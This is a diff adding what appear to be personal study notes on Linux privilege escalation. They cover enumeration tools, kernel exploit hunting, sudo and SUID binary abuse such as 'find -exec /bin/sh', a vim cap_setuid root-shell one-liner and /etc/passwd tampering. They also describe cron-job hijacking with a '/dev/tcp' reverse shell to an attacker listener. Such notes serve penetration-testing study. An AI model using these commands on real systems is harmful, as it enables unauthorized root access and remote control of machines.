@@ -1,0 +1,35 @@
+Use privesc enumeration tools:
+- LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+- LinEnum: https://github.com/rebootuser/LinEnum
+- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
+- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+
+Kernel exploits:
+1. Identify kernel version with 'uname -a' 
+2. Search a public exploit (use linuxkernelcves.com/cves, Linux Exploit Suggester, searchsploit, exploit-db.com)
+2. Be sure you understand how the exploit code works BEFORE you launch it
+4. Read all comments and instructions provided with the exploit code
+5. Transfer the exploit (or any tool for that matter) with tools like wget, curl, scp and python http.server
+
+Find public exploits for sudo, services running as root and executables with sudo rights
+
+Sudo:
+sudo -l [-U <user>] --> list sudo privileges (programs you can sudo)
+Use https://gtfobins.github.io/ to find binaries known to be exploitable when you have sudo rights
+exploit for nmap: sudo nmap --interactive
+exploit for find: find . -exec /bin/sh \; -quit
+If you have the priv env_keep+=LD_PRELOAD you can create a shared library to be loaded and executed before a program with sudo rights is run
+
+SUID:
+find / -type f -perm -4000 -ls 2>/dev/null
+Use https://gtfobins.github.io/#+suid to find binaries known to be exploitable when the SUID bit is set
+You could try writing /etc/passwd to add a new user, read the file system or spawn a root shell
+
+Capabilities:
+getcap -r / 2>/dev/null
+vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "sh", "-c", "reset; exec sh")' (exploit for vim with cap_setuid capability)
+
+Cron jobs:
+Any user can read the file keeping system-wide cron jobs under 'cat /etc/crontab'
+If there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges (make sure it's executable)
+Type 'bash -i >& /dev/tcp/<host>/<port> 0>&1' in the victim (inside a bash shell, otherwise wrap it inside 'bash -c "<command>"') to connect to attacker (nc -nlvp <port>) 
